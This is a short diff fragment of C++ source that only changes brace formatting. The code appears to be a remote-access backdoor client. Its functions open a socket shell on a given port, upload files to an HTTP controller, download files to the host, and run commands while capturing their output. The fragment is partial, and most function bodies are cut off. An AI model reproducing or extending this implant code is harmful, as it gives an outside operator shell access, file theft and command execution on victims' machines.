@@ -16,7 +16,9 @@
 
 using namespace std;
 
-void openShell(commandInput cmd,httpManager &manager){
+void 
+openShell(commandInput cmd,httpManager &manager)
+{
     struct sockaddr_in sa;
     int s;
     unsigned port = std::stoul (cmd.argv[1]);
@@ -58,25 +60,28 @@ void openShell(commandInput cmd,httpManager &manager){
     
 }
 
-void sendfile(commandInput cmd,httpManager &manager){
-    
+void sendfile(commandInput cmd,httpManager &manager)
+{
     cout << "sending file "<<endl;
     manager.upload(cmd.argv[0].c_str());
     manager.report("file upload");
 }
 
-void writefile(commandInput cmd,httpManager &manager){
+void writefile(commandInput cmd,httpManager &manager)
+{
     cout << "file downloaded." << cmd.argv[0] << endl;
     manager.download(cmd.argv[0].c_str());
     //manager.report("file have been moved");
 }
 
-void execute(commandInput cmd,httpManager &manager){
+void execute(commandInput cmd,httpManager &manager)
+{
     cout << "not implemented." << endl;
     //manager.report("not implemented yet");
 }
 
-void run(commandInput cmd,httpManager &manager){
+void run(commandInput cmd,httpManager &manager)
+{
     char buffer[128];
     cout <<"running cmd" << endl;
     std::string result = "";
